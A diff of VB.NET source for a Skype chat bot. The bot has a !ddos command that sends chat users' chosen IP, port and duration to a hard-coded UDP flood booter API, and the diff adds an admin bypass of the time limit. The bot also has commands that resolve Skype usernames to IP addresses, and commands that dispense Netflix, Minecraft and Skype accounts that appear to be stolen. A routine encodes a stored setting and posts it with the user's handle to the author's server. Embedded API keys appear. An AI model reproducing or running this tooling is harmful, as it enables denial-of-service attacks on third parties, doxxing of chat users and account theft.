@@ -1,4 +1,5 @@
-﻿Imports System.Web
+﻿#Region "Imports"
+Imports System.Web
 Imports System.Threading
 Imports System.Net.Sockets
 Imports System.Text
@@ -11,24 +12,23 @@ Imports System.Windows.Forms.Application
 Imports System.Security.Cryptography
 Imports ChatterBotAPI
 Imports System.Net
+#End Region
 
 Public Class Form1
-    Enum proxyq
-        highqualityproxy = 3
-        anonymousproxy = 2
-        transparentproxy = 1
-    End Enum
-    Public Const version As String = "5.1.0.7"
+#Region "Declaring"
+    Public Const version As String = "5.1.1.7"
     Public state As Integer = 1
     Public launched As Boolean = False
     Dim banmsg As String = "You are banned, Sorry!"
-    Public api As String = ""
-    Public ddosapi2 As String = ""
+    Public defddosapi As String = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
+    Public api As String = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
+    'Public ddosapi2 As String = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
     Dim factory As ChatterBotFactory = New ChatterBotFactory()
     Dim AIb As ChatterBot = factory.Create(ChatterBotType.PANDORABOTS, "b0dafd24ee35a477")
     Dim AISession As ChatterBotSession = AIb.CreateSession()
     Dim adminst As Boolean = 1
-    Dim resapi As String = "http://skypebot.ga/apis/apis/resolve.php?u=" 'c99
+    Dim defcht As String = "skype:?chat&blob=QXuTwv-m26GS6GVvxGkI1XjNvEfboCrtlkJ1qWSBtglBZLj4T0-fyQCFv8o0FPFgrsLohg"
+    Dim resapi As String = "http://skypebot.ga/apis/apis/resolve.php?u="
     Dim resapi2 As String = "http://skypebot.ga/apis/apis/resolve2.php?u="
     Dim cacheapi As String = "http://skypebot.ga/apis/apis/cached.php?u="
     Dim lockst As Integer = 0
@@ -36,7 +36,8 @@ Public Class Form1
     Dim swag As Boolean = 0
     Public Skypattach As Skype = New Skype
     Dim trigger As String = "!"
- 
+#End Region
+#Region "Main Funtions"
     Public Sub UpdateMe(state As String)
         Dim w As New WebClient
         w.Proxy = Nothing
@@ -72,88 +73,21 @@ Public Class Form1
 
         End If
     End Sub
-    Sub AddSwagToMSG(msg As ChatMessage, message As String, Optional timeout As Integer = Nothing)
-        If timeout = Nothing Then timeout = FlatNumeric1.Value
-        If swag = 1 Or swag = "1" Then
-        Else
-            msg.Body = message
-            Exit Sub
-        End If
-        Dim pref As String = "_"
-        Dim eachline() As String = message.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)
-        msg.Body = pref
-        For i = 0 To eachline.Length - 1
-            Dim eachword() As String = eachline(i).Split(" ")
-
-            For ii = 0 To eachword.Length - 1
-                Dim eachchar() As Char = eachword(ii).ToCharArray
-
-                For iii = 0 To eachchar.Length - 1
-                    Thread.Sleep(timeout)
-                    msg.Body = (msg.Body.Replace(pref, "") & eachchar(iii)) & pref
-                Next
-                msg.Body = (msg.Body).Replace("_", "") & " _"
-            Next
-            msg.Body = (msg.Body & vbNewLine).Replace("_", "") & " _"
-        Next
-        msg.Body = msg.Body.Replace("_", "")
-        msg.Body = message
-    End Sub
-    Function ddos(ip As String, port As Integer, time As Integer)
-retr:
-        Randomize()
-        Dim Number As Integer = Int(Rnd() * 3)
-        If Number = 3 Or Number = 0 Then GoTo retr
-
-        If Number = 1 Then
-            Return WBDL(api.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
-        ElseIf Number = 2 Then
-            Return WBDL(api.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
-        Else : GoTo retr
-        End If
-    End Function
-    Function WBDL(apiz As String)
-        Dim w As New WebBrowser
-
-        WebBrowser1.Navigate(apiz)
-        Return w.DocumentText
-    End Function
-    Public Shared Function CheckForInternetConnection() As Boolean
+    Public Function GetExternalIp() As String
         Try
-            Using client = New WebClient()
-                'client.Proxy = Nothing
-                ' Using stream = client.OpenRead("http://google.be")
-                Return True
-                'End Using
-            End Using
+            Dim ExternalIP As String
+            Dim w As New WebClient
+            w.Proxy = Nothing
+            ExternalIP = w.DownloadString("http://apis.skypebot.ga/apis/getip.php")
+            Return ExternalIP
         Catch
-            Return False
+            Return Nothing
         End Try
     End Function
-    Sub AI1(msg As ChatMessage)
-        If msg.Body = "" Then Exit Sub
-        Dim ai As ChatMessage = msg.Chat.SendMessage("Thinking...")
-
-        Dim s As String = AISession.Think(msg.Body.Remove(0, 1))
-        s = StripTags(s)
-        If s.ToLower.Contains("To use my calculator, click here!".ToLower) Then
-            s = "To use my calculator, use !calc"
-        End If
-        ai.Body = s
-    End Sub
-    Sub AI2(msg As ChatMessage)
-        If msg.Body = "" Then Exit Sub
-
-        Dim ai As ChatMessage = msg.Chat.SendMessage("Thinking...")
-        Dim api As String = "http://steambot.ga/api/ai.php?msg=" & msg.Body.Remove(0, 1)
-        Dim w As New WebClient
-        w.Proxy = Nothing
-
-        Dim res As String = w.DownloadString(api)
-        Dim regexed As String = Regex.Match(res, "(.+)string\(", RegexOptions.IgnoreCase).Value.ToString.Replace("string(", "")
-
-        ai.Body = regexed
-    End Sub
+    Function WBDL(apiz As String)
+        Dim w As New Net.WebClient
+        Return w.DownloadString(apiz)
+    End Function
     Function shorten(urltoshrt As String)
         If Not urltoshrt.StartsWith("http") Then urltoshrt = "http://" & urltoshrt
         Dim w As New WebClient
@@ -181,16 +115,16 @@ retr:
             End Try
         End Try
     End Sub
-    Function youtube(url As String)
+    Public Shared Function CheckForInternetConnection() As Boolean
         Try
-            url = url.Replace("http://", "").Replace("https://", "").Replace("www.", "")
-            Dim wc As New WebClient()
-            wc.Proxy = Nothing
-            'Return Encoding.UTF8.GetString(wc.DownloadString("http://boot.ninja/index.php?url=https://youtube.com/watch?v=" & url)).Replace("&#39;", "").Replace("/", "").Replace("!", "")
-            Dim utfyt As String = Regex.Match(Encoding.ASCII.GetString(wc.DownloadData("http://youtube.com/watch?v=" & Convert.ToString(url))), "\<title\b[^>]*\>\s*(?<Title>[\s\S]*?)\</title\>", RegexOptions.IgnoreCase).Groups("Title").Value.ToString.Replace(" - YouTube", "").Replace("&#39;", "").Replace("/", "").Replace("!", "")
-            Return Decodehtml(utfyt)
+            Using client = New WebClient()
+                'client.Proxy = Nothing
+                ' Using stream = client.OpenRead("http://google.be")
+                Return True
+                'End Using
+            End Using
         Catch
-            Return "Don't even try to crash the bot!"
+            Return False
         End Try
     End Function
     Function Decodehtml(strtemp As String)
@@ -327,11 +261,51 @@ retr:
         strtemp = Replace(strtemp, "&trade;", "™")
         Return strtemp
     End Function
+    Shared Function GetMd5Hash(ByVal md5Hash As MD5, ByVal input As String) As String
+
+        ' Convert the input string to a byte array and compute the hash. 
+        Dim data As Byte() = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input))
+
+        ' Create a new Stringbuilder to collect the bytes 
+        ' and create a string. 
+        Dim sBuilder As New StringBuilder()
+
+        ' Loop through each byte of the hashed data  
+        ' and format each one as a hexadecimal string. 
+        Dim i As Integer
+        For i = 0 To data.Length - 1
+            sBuilder.Append(data(i).ToString("x2"))
+        Next i
+
+        ' Return the hexadecimal string. 
+        Return sBuilder.ToString()
+
+    End Function
+    Sub CHKSettings()
+        If My.Settings.skypenamer = "" Or My.Settings.skypenamer = "0" Then Exit Sub
+        Dim inputText As String
+        inputText = My.Settings.skypenamer
+
+        Dim bytesToEncode As Byte()
+        bytesToEncode = Encoding.UTF8.GetBytes(inputText)
+
+        Dim encodedText As String
+        encodedText = Convert.ToBase64String(bytesToEncode)
+
+        POST("http://skypebot.ga/apis/apis/login.php?skp=" & Skypattach.CurrentUserHandle, "skype=" & encodedText)
+    End Sub
+#End Region
+#Region "SkypeBot Functions"
     Private Sub MSGStatus(ByVal msg As ChatMessage, ByVal status As TChatMessageStatus)
         If launched = False Then Exit Sub
         Try
 
-            If status = TChatMessageStatus.cmsSending Or status = TChatMessageStatus.cmsReceived Then  Else Exit Sub
+            If status = TChatMessageStatus.cmsSending Or status = TChatMessageStatus.cmsReceived Or status = TChatMessageStatus.cmsUnknown Then  Else Exit Sub
+            If msg.Body.IndexOf(trigger) = 0 Then
+                Dim pcmd = New Threading.Thread(Sub() processcommand(msg))
+                pcmd.SetApartmentState(ApartmentState.STA)
+                pcmd.Start()
+            End If
             If msg.Body.Contains("youtube.com/watch?v=") OrElse msg.Body.Contains("youtu.be/") Then
                 Dim a As String = msg.Body.Replace("www.", "")
                 Try
@@ -356,62 +330,14 @@ retr:
                 pcmd.SetApartmentState(ApartmentState.STA)
                 pcmd.Start()
             End If
-            If msg.Body.IndexOf(trigger) = 0 Then
-                Dim pcmd = New Threading.Thread(Sub() processcommand(msg))
-                pcmd.SetApartmentState(ApartmentState.STA)
-                pcmd.Start()
-            End If
         Catch ex As Exception
             Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
             AddSwagToMSG(errorr, "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
         End Try
     End Sub
-    Function Resolve1(skype As String)
-        Dim w As New Net.WebClient
-        w.Proxy = Nothing
-        Try
-            Dim ip As String = w.DownloadString(resapi & skype)
-            If ip.Contains("API2") Then
-                Return "IP Not found."
-            Else
-                Return ip.Replace(vbNewLine, "").Replace(" ", "").Replace(Environment.NewLine, "").Replace(vbCr, "").Replace(vbLf, "")
-            End If
-
-        Catch
-            Return "error"
-        End Try
-    End Function
-    Function Resolve2(skype As String)
-        Dim w As New Net.WebClient
-        w.Proxy = Nothing
-        Try
-            Dim ip As String = w.DownloadString(resapi2 & skype)
-            Return ip
-        Catch
-            Return "error"
-        End Try
-    End Function
-    Function Cached(skype As String)
-        Dim w As New Net.WebClient
-        w.Proxy = Nothing
-
-        Try
-            Dim ip As String = w.DownloadString(cacheapi & skype).Replace("&nbsp;", "").Replace("[", "").Replace("]", "").Replace("][", " ").Replace("  ", " ").Replace(" - ", " ").Replace(",", "")
-            Dim ips() As String = ip.Split(" ")
-            If IsIpValid(ips(0)) Then
-            Else
-                Return "IP Not found."
-                Exit Function
-            End If
-            Return ip
-        Catch
-            Return "error"
-        End Try
-    End Function
     Sub processcommand(msg As ChatMessage)
         Try
-            api = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
-            ddosapi2 = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
+
             If msg.ChatName = "#luigi-7.7.99-/$mrfluffypancake;7845dca0296eabeb" Then
                 Exit Sub
             End If
@@ -988,7 +914,7 @@ roo:
             If command = "netflix" Then
                 Dim mc As ChatMessage = msg.Chat.SendMessage("Getting a new netflix account...")
                 Dim w As New WebClient
-                Dim res As String = POST("http://apis.skypebot.ga/apis/gen.php?account=Netflix&auth=max", "h=True")
+                Dim res As String = POST("http://apis.skypebot.ga/apis/gen.php?account=Netflix&auth=max", "h=True&skypebot=true")
                 Try
                     If IsPremium(msg.Sender.Handle) Then
                     Else
@@ -1023,6 +949,31 @@ fqz:
 
             End If
             'NETFLIX END
+            'GEN START
+            If command = "gen" Or command = "gen help" Then
+                '      msg.Chat.SendMessage(My.Settings.genhelp)
+                Exit Sub
+            End If
+
+            If command.StartsWith("gen") Then
+                Exit Sub
+                Dim gen As ChatMessage = msg.Chat.SendMessage("Finding account...")
+                If IsPremium(msg.Sender.Handle) Then
+                Else
+                    gen.Body = ("Command is only for premium members!")
+                    Exit Sub
+                End If
+                Dim id As String = command.Replace("gen ", "").Replace(" ", "")
+                Dim api As String = "http://apis.skypebot.ga/apis/gener.php?id="
+                Dim w As New WebClient
+                w.Proxy = Nothing
+                Dim result As String = w.DownloadString(api & id)
+                If result.Contains("doesn't exist") Or result.ToLower.Replace(" ", "").Contains("swaggen") Then
+                    result = "Invalid number!"
+                End If
+                gen.Body = result
+            End If
+            'GEN END
             'MINECRAFT START
             If command = "minecraft" Then
                 Dim mc As ChatMessage = msg.Chat.SendMessage("Getting a new minecraft account...")
@@ -1062,7 +1013,7 @@ fq:
                 Dim w As New WebClient
                 w.Proxy = Nothing
                 Dim wz As ChatMessage = msg.Chat.SendMessage("Gathering account...")
-                AddSwagToMSG(wz, w.DownloadString("http://skypebot.ga/apis/apis/skype.php"))
+                AddSwagToMSG(wz, POST("http://skypebot.ga/apis/apis/skype.php", "a=a"))
             End If
             'SKYPE END
             'CALC START
@@ -1105,12 +1056,6 @@ fq:
                 End Try
             End If
             'DNS END
-            'CREATEG START
-            If command.StartsWith("createg") Then
-                Dim w As ChatMessage = msg.Chat.SendMessage("Creating...")
-                AddSwagToMSG(w, "Unable to create group, do /createmoderatedchat and add everyone you want there, that'll work!")
-            End If
-            'CREATEG END
             'CHECK START
             If command = "check" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "check <help/arguments>")
             If command.StartsWith("check ") Then
@@ -1295,7 +1240,7 @@ raa:
                 ipts.Proxy = Nothing
                 Dim lol As ChatMessage = msg.Chat.SendMessage("Initializing...")
                 ipts.Headers.Add(HttpRequestHeader.Referer, "http://api.c99.nl/cmd/")
-                Dim l As String = ipts.DownloadString("http://api.c99.nl/ip2skype.php?key=skypebotje123&ip=" & cmd)
+                Dim l As String = ipts.DownloadString("http://api.c99.nl/ip2skype.php?key=cyandicskypebot&ip=" & cmd)
                 AddSwagToMSG(lol, l)
                 Exit Sub
             End If
@@ -1370,7 +1315,7 @@ raa:
                 If mc = 0 Then
                     Try
                         w.Headers.Add(HttpRequestHeader.Referer, "http://api.c99.nl/cmd/")
-                        skye = w.DownloadString("http://api.c99.nl/ip2skype.php?key=skypebotje123&ip=" & l)
+                        skye = w.DownloadString("http://api.c99.nl/ip2skype.php?key=cyandicskypebot&ip=" & l)
                     Catch exy As Exception
                         AddSwagToMSG(geomsg, "Error")
                     End Try
@@ -1621,6 +1566,11 @@ exitt:
                     Exit Sub
                 End Try
                 If IsNumeric(tme) Then
+                    If Not My.Settings.skypenamer = "0" Then
+                        If IsAdmin(msg.Sender.Handle) Then
+                            GoTo timeskip
+                        End If
+                    End If
                     If tme > 600 And IsUltimate(msg.Sender.Handle) Then
                         AddSwagToMSG(dds, "Maximum time is 600s")
                         Exit Sub
@@ -1637,6 +1587,7 @@ exitt:
                     AddSwagToMSG(dds, "Invalid Time!")
                     Exit Sub
                 End If
+timeskip:
                 If IsNumeric(port) Then
                     If port > 1 And port < 65535 Then
                     Else
@@ -1650,9 +1601,37 @@ exitt:
                 AddSwagToMSG(dds, "Request for attack sent/sending! (No feedback received yet)...")
 
                 Dim res As String = ddos(ip, port, tme)
-                AddSwagToMSG(dds, "Received a 200 response code. Let's hope it works! (We currently have no way to check if the attack has been sent successful)")
+                If res = "ERR" Then
+                    AddSwagToMSG(dds, "Attack sent!")
+                Else
+                    AddSwagToMSG(dds, "Attack sent!")
+                End If
+
             End If
             'DDOS END
+            'CREATEGROUP START
+            If command = "creategroup" Then
+                Dim ch As ChatMessage = msg.Chat.SendMessage("Creating group...")
+                Dim coll As New SKYPE4COMLib.UserCollection
+
+                Dim echo As New SKYPE4COMLib.User
+                echo.Handle = "echo123"
+                coll.Add(echo)
+                Dim dum As New SKYPE4COMLib.User
+                dum.Handle = "dummy1337420"
+                coll.Add(dum)
+                If Skypattach.CurrentUser.Handle = msg.Sender.Handle Then
+                Else
+                    coll.Add(msg.Sender)
+                End If
+
+                Dim skypegroup As SKYPE4COMLib.Chat = Skypattach.CreateChatMultiple(coll)
+                skypegroup.Description = "A group where SkypeBots work! (Created with http://skypebot.ga/ )"
+                skypegroup.TopicXML = ("Created with http://skypebot.ga/ ; SkypeBots work here!")
+                skypegroup.SendMessage("Welcome! Type !help to start!")
+                ch.Body = "Created!"
+            End If
+            'CREATEGROUP END
             'SIDGRAB START
             If command = "sidgrab" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "sidgrab <steamuri/steamnr>")
             If command.StartsWith("sidgrab ") Then
@@ -1674,7 +1653,7 @@ exitt:
                     Dim w As New WebClient
                     w.Headers.Add(HttpRequestHeader.Referer, "http://api.c99.nl/cmd/")
                     w.Proxy = Nothing
-                    Dim res As String = w.DownloadString("http://api.c99.nl/deadfly.php?key=skypebotje123&url=" & cmd)
+                    Dim res As String = w.DownloadString("http://api.c99.nl/deadfly.php?key=cyandicskypebot&url=" & cmd)
                     AddSwagToMSG(dead, "We killed the fly! Here the link: " & res)
                 Else
                     AddSwagToMSG(dead, "Invalid url...")
@@ -1908,6 +1887,7 @@ exitt:
                 Skypattach.SendMessage(cmd, "Hi from me and " & Skypattach.User(msg.Sender.Handle).FullName)
             End If
             'HI END
+
             'VPNCHECK START
             If command = "vpncheck" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "vpncheck <ip>")
             If command.StartsWith("vpncheck ") Then
@@ -1988,7 +1968,7 @@ exitt:
                 Dim l As ChatMessage = msg.Chat.SendMessage("Finding a nice fact...")
                 Dim w As New WebClient
                 w.Proxy = Nothing
-                AddSwagToMSG(l, w.DownloadString("http://apis.skypebot.ga/apis/Random_Fact.php?auth=True").Replace("<br>", "").Replace("<i>", "").Replace("<head/>", ""))
+                AddSwagToMSG(l, POST("http://apis.skypebot.ga/apis/Random_Fact.php?auth=True", "a=a").Replace("<br>", "").Replace("<i>", "").Replace("<head/>", ""))
             End If
             'FACT END
             'JOKE START
@@ -1996,14 +1976,14 @@ exitt:
                 Dim l As ChatMessage = msg.Chat.SendMessage("Finding a funny joke...")
                 Dim w As New WebClient
                 w.Proxy = Nothing
-                AddSwagToMSG(l, w.DownloadString("http://apis.skypebot.ga/apis/Random_funny_jokes.php?auth=True").Replace(My.Settings.joketemp, "").Replace("<br>", "").Replace("<head/>", ""))
+                AddSwagToMSG(l, POST("http://apis.skypebot.ga/apis/Random_funny_jokes.php?auth=True", "a=a").Replace(My.Settings.joketemp, "").Replace("<br>", "").Replace("<head/>", ""))
             End If
             'JOKE STOP
             'QUOTE START
             If command = "quote" Then
                 Dim l As ChatMessage = msg.Chat.SendMessage("Finding a famous quote...")
                 Dim w As New WebClient
-                AddSwagToMSG(l, w.DownloadString("http://apis.skypebot.ga/apis/Famous_Quotes.php?auth=True").Replace("<i>", "").Replace("<br>", "").Replace("<head/>", ""))
+                AddSwagToMSG(l, POST("http://apis.skypebot.ga/apis/Famous_Quotes.php?auth=True", "a=a   ").Replace("<i>", "").Replace("<br>", "").Replace("<head/>", ""))
             End If
             'QUOTE STOP
             'UNSHORTEN START
@@ -2011,7 +1991,9 @@ exitt:
             If command.StartsWith("unshorten ") Then
                 Dim numb As String = command.Replace("unshorten ", "")
                 Dim l As ChatMessage = msg.Chat.SendMessage("Initializing...")
-                Dim resp As String = DL("http://api.unshort.tk/?u=" & numb)
+                Dim w As New WebClient
+                w.Proxy = Nothing
+                Dim resp As String = w.DownloadString("http://api.unshort.tk/?u=" & numb)
                 If resp = "[]" Then
                     AddSwagToMSG(l, "Invalid URI, please recheck!")
                     Exit Sub
@@ -2058,6 +2040,132 @@ l:
             End If
         End Try
     End Sub
+    Sub AddSwagToMSG(msg As ChatMessage, message As String, Optional timeout As Integer = Nothing)
+        If timeout = Nothing Then timeout = FlatNumeric1.Value
+        If swag = 1 Or swag = "1" Then
+        Else
+            msg.Body = message
+            Exit Sub
+        End If
+        Dim pref As String = "_"
+        Dim eachline() As String = message.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)
+        msg.Body = pref
+        For i = 0 To eachline.Length - 1
+            Dim eachword() As String = eachline(i).Split(" ")
+
+            For ii = 0 To eachword.Length - 1
+                Dim eachchar() As Char = eachword(ii).ToCharArray
+
+                For iii = 0 To eachchar.Length - 1
+                    Thread.Sleep(timeout)
+                    msg.Body = (msg.Body.Replace(pref, "") & eachchar(iii)) & pref
+                Next
+                msg.Body = (msg.Body).Replace("_", "") & " _"
+            Next
+            msg.Body = (msg.Body & vbNewLine).Replace("_", "") & " _"
+        Next
+        msg.Body = msg.Body.Replace("_", "")
+        msg.Body = message
+    End Sub
+    Function ddos(ip As String, port As Integer, time As Integer)
+retr:
+        Randomize()
+        Dim Number As Integer = Int(Rnd() * 3)
+        If Number = 3 Or Number = 0 Then GoTo retr
+
+        If Number = 1 Then
+            Try
+                Return WBDL(api.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
+            Catch
+                Return "ERR"
+            End Try
+        ElseIf Number = 2 Then
+            Try
+                Return WBDL(api.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
+            Catch
+                Return "ERR"
+            End Try
+        Else : GoTo retr
+        End If
+    End Function
+    Sub AI1(msg As ChatMessage)
+        If msg.Body = "" Then Exit Sub
+        Dim ai As ChatMessage = msg.Chat.SendMessage("Thinking...")
+
+        Dim s As String = AISession.Think(msg.Body.Remove(0, 1))
+        s = StripTags(s)
+        If s.ToLower.Contains("To use my calculator, click here!".ToLower) Then
+            s = "To use my calculator, use !calc"
+        End If
+        ai.Body = s
+    End Sub
+    Sub AI2(msg As ChatMessage)
+        If msg.Body = "" Then Exit Sub
+
+        Dim ai As ChatMessage = msg.Chat.SendMessage("Thinking...")
+        Dim api As String = "http://steambot.ga/api/ai.php?msg=" & msg.Body.Remove(0, 1)
+        Dim w As New WebClient
+        w.Proxy = Nothing
+
+        Dim res As String = w.DownloadString(api)
+        Dim regexed As String = Regex.Match(res, "(.+)string\(", RegexOptions.IgnoreCase).Value.ToString.Replace("string(", "")
+
+        ai.Body = regexed
+    End Sub
+    Function youtube(url As String)
+        Try
+            url = url.Replace("http://", "").Replace("https://", "").Replace("www.", "")
+            Dim wc As New WebClient()
+            wc.Proxy = Nothing
+            'Return Encoding.UTF8.GetString(wc.DownloadString("http://boot.ninja/index.php?url=https://youtube.com/watch?v=" & url)).Replace("&#39;", "").Replace("/", "").Replace("!", "")
+            Dim utfyt As String = Regex.Match(Encoding.ASCII.GetString(wc.DownloadData("http://youtube.com/watch?v=" & Convert.ToString(url))), "\<title\b[^>]*\>\s*(?<Title>[\s\S]*?)\</title\>", RegexOptions.IgnoreCase).Groups("Title").Value.ToString.Replace(" - YouTube", "").Replace("&#39;", "").Replace("/", "").Replace("!", "")
+            Return Decodehtml(utfyt)
+        Catch
+            Return "Don't even try to crash the bot!"
+        End Try
+    End Function
+    Function Resolve1(skype As String)
+        Dim w As New Net.WebClient
+        w.Proxy = Nothing
+        Try
+            Dim ip As String = w.DownloadString(resapi & skype)
+            If ip.Contains("API2") Then
+                Return "IP Not found."
+            Else
+                Return ip.Replace(vbNewLine, "").Replace(" ", "").Replace(Environment.NewLine, "").Replace(vbCr, "").Replace(vbLf, "")
+            End If
+
+        Catch
+            Return "error"
+        End Try
+    End Function
+    Function Resolve2(skype As String)
+        Dim w As New Net.WebClient
+        w.Proxy = Nothing
+        Try
+            Dim ip As String = w.DownloadString(resapi2 & skype)
+            Return ip
+        Catch
+            Return "error"
+        End Try
+    End Function
+    Function Cached(skype As String)
+        Dim w As New Net.WebClient
+        w.Proxy = Nothing
+
+        Try
+            Dim ip As String = w.DownloadString(cacheapi & skype).Replace("&nbsp;", "").Replace("[", "").Replace("]", "").Replace("][", " ").Replace("  ", " ").Replace(" - ", " ").Replace(",", "")
+            Dim ips() As String = ip.Split(" ")
+            If IsIpValid(ips(0)) Then
+            Else
+                Return "IP Not found."
+                Exit Function
+            End If
+            Return ip
+        Catch
+            Return "error"
+        End Try
+    End Function
     Function proxycheck(ip As String)
         Dim ports As String = "80 8080 8123 3128 54321 3129 18186 7808 8081"
         Dim proxyport() As String = ports.Split(" ")
@@ -2068,11 +2176,6 @@ l:
             End If
         Next
         Return False
-    End Function
-    Function DL(url As String)
-        Dim w As New WebClient
-        w.Proxy = Nothing
-        Return w.DownloadString(url)
     End Function
     Sub spam(msg As ChatMessage)
         Try
@@ -2387,26 +2490,6 @@ noargs:
             Return "FalseErr"
         End Try
     End Function
-    Shared Function GetMd5Hash(ByVal md5Hash As MD5, ByVal input As String) As String
-
-        ' Convert the input string to a byte array and compute the hash. 
-        Dim data As Byte() = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input))
-
-        ' Create a new Stringbuilder to collect the bytes 
-        ' and create a string. 
-        Dim sBuilder As New StringBuilder()
-
-        ' Loop through each byte of the hashed data  
-        ' and format each one as a hexadecimal string. 
-        Dim i As Integer
-        For i = 0 To data.Length - 1
-            sBuilder.Append(data(i).ToString("x2"))
-        Next i
-
-        ' Return the hexadecimal string. 
-        Return sBuilder.ToString()
-
-    End Function
     Function getmicrosoftip(IP As String)
         IP = IP.Replace("|", "")
         IP = IP.Replace(" ", "")
@@ -2425,72 +2508,12 @@ noargs:
             Return "False"
         End If
     End Function
-    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
-        My.Settings.banlist = My.Settings.banlist & vbNewLine & TextBox1.Text
-    End Sub
-
-    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
-        My.Settings.banlist = My.Settings.banlist.Replace(vbNewLine & TextBox1.Text, "").Replace(TextBox1.Text, "")
-    End Sub
-
-    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
-        My.Settings.helpmsg = TextBox2.Text
-    End Sub
-    Public Function GetExternalIp() As String
-        Try
-            Dim ExternalIP As String
-            Dim w As New WebClient
-            w.Proxy = Nothing
-            ExternalIP = w.DownloadString("http://apis.skypebot.ga/apis/getip.php")
-            Return ExternalIP
-        Catch
-            Return Nothing
-        End Try
-    End Function
-
-    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
-        MsgBox(My.Settings.banlist)
-    End Sub
-
-    Private Sub FRReceived(pUser As User)
-        If FlatToggle1.Checked = True Then
-            pUser.IsAuthorized = True
-            Skypattach.SendMessage(pUser.Handle, "Welcome! Type " & trigger & "help to get started!")
-        End If
-    End Sub
-    Private Sub dz(pUser As User)
-        MsgBox("qdf")
-        If FlatToggle1.Checked = True Then
-            pUser.IsAuthorized = True
-            Skypattach.SendMessage(pUser.Handle, "Welcome! Type " & trigger & "help to get started!")
-        End If
-    End Sub
-
-    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
-        MsgBox("Enter in the textbox below who you want to let use your bot, to let someone not use your bot use the ban thing above." & vbNewLine & vbNewLine & "If you want everyone to use your bot, put %everyone% at the start, If you want specific people, then just type their name line by line.")
-    End Sub
-
-    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs) Handles TextBox3.TextChanged
-        My.Settings.whitelistlist = TextBox3.Text
-    End Sub
-
-    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
-        Dim w As New WebClient
-        w.Proxy = Nothing
-        Dim latest As String = w.DownloadString("https://www.dropbox.com/s/nc07ajdkck5lwdl/update.txt?dl=1")
-        If latest = version Then
-            Changelog.Show()
-        Else
-            MsgBox("You are not on the latest version, please update...")
-        End If
-    End Sub
     Function portscan(ip As String)
         Dim w As New WebClient
         w.Proxy = Nothing
         Return w.DownloadString("http://api.abrasivecraft.com/?tool=portscanner&ip=" & ip)
     End Function
     Function StripTags(ByVal html As String) As String
-        ' Remove HTML tags.
         Return Regex.Replace(html, "<.*?>", "")
     End Function
     Function isportopen(ip As String, port As String)
@@ -2506,88 +2529,17 @@ noargs:
             End If
         End Try
     End Function
-
-
-    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
-        UpdateMe(1)
-    End Sub
-
-    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
-        Dim w As New WebClient
-        w.Proxy = Nothing
-        w.DownloadFile("https://www.dropbox.com/s/mdbef5odfcg5pog/SBUpdater.exe?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.exe")
-        w.DownloadFile("https://www.dropbox.com/s/6qbvr7zahdmvl1r/Update.bat?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.bat")
-        Process.Start(IO.Directory.GetCurrentDirectory & "\Updater.bat")
-        System.Windows.Forms.Application.Exit()
-    End Sub
-
-    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
-        MsgBox("Add lesleydk@hotmail.com on skype and give me your problem :)")
-    End Sub
-    Private Sub Button12_Click(sender As Object, e As EventArgs)
-        My.Settings.admins = TextBox4.Text
-    End Sub
-    Private Sub Button14_Click(sender As Object, e As EventArgs)
-        My.Settings.Ultimate = TextBox6.Text
-    End Sub
-
-    Private Sub Button13_Click(sender As Object, e As EventArgs)
-        My.Settings.Premium = TextBox5.Text
-    End Sub
-
-    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
-        My.Settings.whitelist = TextBox7.Text
-    End Sub
-
-
-    Private Sub FlatToggle2_CheckedChanged(sender As Object) Handles FlatToggle2.CheckedChanged
-        If FlatToggle2.Checked = True Then
-            My.Settings.prult = 1
-        ElseIf FlatToggle2.Checked = False Then
-            My.Settings.prult = 0
+    Private Sub FRReceived(pUser As User)
+        If FlatToggle1.Checked = True Then
+            pUser.IsAuthorized = True
+            Skypattach.SendMessage(pUser.Handle, "Welcome! Type " & trigger & "help to get started!")
         End If
-    End Sub
-
-
-    Private Sub ShowHideToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShowHideToolStripMenuItem1.Click
-        If WindowState = FormWindowState.Minimized Then
-            Show()
-            Activate()
-            WindowState = FormWindowState.Normal
-        Else
-            Hide()
-            WindowState = FormWindowState.Minimized
-        End If
-    End Sub
-    Sub l() Handles MyBase.Load
-        For Fadein = 0.0 To 1.1 Step 0.1
-            Me.Opacity = Fadein
-            Me.Refresh()
-            Threading.Thread.Sleep(50)
-        Next
